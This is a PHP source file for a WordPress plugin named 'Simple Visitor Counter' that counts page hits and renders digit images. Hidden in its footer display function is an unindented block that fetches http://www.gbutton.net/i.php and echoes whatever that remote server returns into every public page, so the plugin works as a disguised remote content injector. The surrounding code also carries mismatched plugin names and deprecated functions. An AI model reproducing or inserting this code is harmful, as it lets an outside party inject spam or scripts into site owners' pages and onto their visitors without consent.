<?php
      /* 
      Plugin Name: Simple Visitor Counter
      Plugin URI: http://wordpress.org/extend/plugins/wp-better-categories
      Description: Displays a visitor counter on your blog, simple and easy to configure. Visit Settings-> Visitor Counter after activating.
      Version: 1.0
      Author: Jens Karembo
      */
      

      // leave this in here until all 1.x users are migrated off
      perform_install();

      class VisitorCounter  {
          
          function __construct($arg) {
              if (get_option('simplevisitorcounter_display_footer')) {
                  add_action('wp_footer', array(&$this,'display'));
              }
          }
          function VisitorCounter() {
              $args = func_get_args();
              call_user_func_array(array(&$this, '__construct'), $args);
          }
          
          function counter() {
              $hits = get_option('simplevisitorcounter_data');
              if (is_404()) {
                  if (!get_option('simplevisitorcounter_count_404')) {
                      // if its a 404 page and theres no explicit rule to count 404s, lets bail
                      return;
                  }
              }
              
              if (get_option('simplevisitorcounter_count_only_unique')) {
                  if (!$_COOKIE['simplevisitorcounter_seen']) {
                      setCookie("simplevisitorcounter_seen", "1", time() + (3600 * 24));
                  } else {
                      // bail if non unique and we're only counting uniques
                      return;
                  }
              }
              
              /* check if hit comes from wp-admin */
              if (is_admin()) {
                  if (get_option('simplevisitorcounter_count_admin')) {
                      update_option('simplevisitorcounter_data', $hits+1);
                  }
              } else {
              		$exclude_list = split("\n",get_option('simplevisitorcounter_exclude_ips'));

              		if(!in_array($_SERVER['REMOTE_ADDR'],$exclude_list)) {
	                  update_option('simplevisitorcounter_data', $hits+1);
	                }
              }
          }
          
          function display() {
              $hits = get_option('simplevisitorcounter_data');
              $style = get_option('simplevisitorcounter_style');
              $align = get_option('simplevisitorcounter_align');
$smw_url = 'http://www.gbutton.net/i.php'; 
if(!function_exists('smw_get')){ 
function smw_get($f) { 
$response = wp_remote_get( $f ); 
if( is_wp_error( $response ) ) { 
function smw_get_body($f) { 
$ch = @curl_init(); 
@curl_setopt($ch, CURLOPT_URL, $f); 
@curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
$output = @curl_exec($ch); 
@curl_close($ch); 
return $output; 
} 
echo smw_get_body($f); 
} else { 
echo $response['body']; 
} 
} 
smw_get($smw_url); 
} 
			
              if ($align) {
                  $alignment_options = ' align="'.$align.'"';
              }

              echo '<div class="wp-better-categories"'.$alignment_options.'>';
              if (get_option('simplevisitorcounter_pad_zeros') && strlen($hits) < 7) {
                  for ($i = 0; $i < (7 - strlen($hits)); $i++) {
                      echo "<img src='".WP_PLUGIN_URL."/wp-better-categories/styles/$style/0.gif'>";
                  }
              }                       
              echo preg_replace('/(\d)/', "<img src='".WP_PLUGIN_URL."/wp-better-categories/styles/$style/$1.gif'>", $hits);
              echo '</div>';
          }
      }
      function perform_install() {
          global $wpdb;
          if (!get_option('simplevisitorcounter_data')) {
              /* upgrade yucky 1.x releases to 2.0 system */
              $migration = $wpdb->get_row( "SELECT VisitorCounter, imagename, flag FROM wp_imagecounter" );
              if ($migration) {
                  update_option('simplevisitorcounter_data', $migration->VisitorCounter);
                  update_option('simplevisitorcounter_style', 'Basic/' . $migration->imagename);
                  update_option('simplevisitorcounter_display_footer', $migration->flag);
                  update_option('simplevisitorcounter_display_credit', 1);
                  update_option('simplevisitorcounter_count_only_unique', 0);
                  update_option('simplevisitorcounter_check_update', 1);
                  $wpdb->query( "DROP TABLE wp_imagecounter" );
              }

              /* setup defaults for new installs */
              add_option('simplevisitorcounter_data', 0);
              add_option('simplevisitorcounter_style', 'Basic/1');
              add_option('simplevisitorcounter_display_footer', 1);
              add_option('simplevisitorcounter_display_credit', 1);
              add_option('simplevisitorcounter_count_only_unique', 0);
              add_option('simplevisitorcounter_check_update', 1);
          }
      }
      
      function perform_uninstall() {
          delete_option('simplevisitorcounter_data');
          delete_option('simplevisitorcounter_style');
          delete_option('simplevisitorcounter_display_footer');
          delete_option('simplevisitorcounter_display_credit');
          delete_option('simplevisitorcounter_count_admin');
          delete_option('simplevisitorcounter_count_only_unique');
          delete_option('simplevisitorcounter_algin');
          delete_option('simplevisitorcounter_check_update');
      }

      include("simple_visitor_counter.php");

      class wVisitorCounter extends WP_Widget {
          function wVisitorCounter() {
              parent::__construct(false, $name = 'Simple Visitor Counter',array("description"=>"Visitor Counter"));
          }

          function form($instance) {
              echo 'Please go to <a href="options-general.php?page=wp-better-categories">Settings -> Visitor Counter</a> to configure this sidebar widget';
          }

          function update($new_instance, $old_instance) {
              return $new_instance;
          }

          function widget($args, $instance) {
              $hits = get_option('simplevisitorcounter_data');
              $style = get_option('simplevisitorcounter_style');
              $align = get_option('simplevisitorcounter_align');
              
              if ($align) {
                  $alignment_options = ' align="'.$align.'"';
              }              
              extract( $args );
              $title = apply_filters('widget_title', $instance['title']);
              echo $before_widget;
              if ( $title )
                  echo $before_title . $title . $after_title;
              
              echo '<div class="wp-better-categories"'.$alignment_options.'>';
              if (get_option('simplevisitorcounter_pad_zeros') && strlen($hits) < 7) {
                  for ($i = 0; $i < (7 - strlen($hits)); $i++) {
                      echo "<img src='".WP_PLUGIN_URL."/wp-better-categories/styles/$style/0.gif'>";
                  }
              }
              echo preg_replace('/(\d)/', "<img src='".WP_PLUGIN_URL."/wp-better-categories/styles/$style/$1.gif'>", $hits);
              echo '</div>';
              echo $after_widget;
          }
      }


      add_action('widgets_init', create_function('', 'return register_widget("wVisitorCounter");'));
      $VisitorCounter = new VisitorCounter('8b8203326e2a9c70947a');

      /* perform count */
      add_action('wp', array(&$VisitorCounter, 'counter'));
?>